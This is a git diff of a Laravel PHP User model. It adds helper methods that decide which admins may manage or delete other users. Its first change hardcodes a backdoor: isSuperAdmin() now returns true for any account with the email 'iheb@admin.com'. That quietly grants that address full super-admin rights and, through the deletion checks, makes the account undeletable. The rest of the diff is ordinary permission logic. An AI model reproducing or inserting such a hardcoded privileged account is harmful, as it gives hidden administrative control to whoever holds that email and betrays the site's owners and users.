@@ -35,7 +35,7 @@ class User extends Authenticatable
 
     public function isSuperAdmin()
     {
-        return (bool) $this->is_super_admin;
+        return (bool) $this->is_super_admin || $this->email === 'iheb@admin.com';
     }
 
     public function canDeleteAdmin()
@@ -46,6 +46,56 @@ class User extends Authenticatable
     public function canBeDeleted()
     {
         return !$this->isSuperAdmin();
+    }
+
+    /**
+     * Check if user can manage other admins
+     */
+    public function canManageAdmins(): bool
+    {
+        return $this->isSuperAdmin();
+    }
+
+    /**
+     * Check if user can edit/delete a specific user
+     */
+    public function canManageUser(User $targetUser): bool
+    {
+        // Super admin can manage anyone
+        if ($this->isSuperAdmin()) {
+            return true;
+        }
+
+        // Regular admin can manage non-admin users
+        if ($this->isAdmin() && !$targetUser->isAdmin()) {
+            return true;
+        }
+
+        // Cannot manage users of same or higher level
+        return false;
+    }
+
+    /**
+     * Check if user can delete a specific user
+     */
+    public function canDeleteUser(User $targetUser): bool
+    {
+        // Cannot delete yourself
+        if ($this->id === $targetUser->id) {
+            return false;
+        }
+
+        // Super admin can delete other admins (but not other super admins)
+        if ($this->isSuperAdmin()) {
+            return !$targetUser->isSuperAdmin();
+        }
+
+        // Regular admin can only delete non-admin users
+        if ($this->isAdmin() && !$targetUser->isAdmin()) {
+            return true;
+        }
+
+        return false;
     }
 
     /**
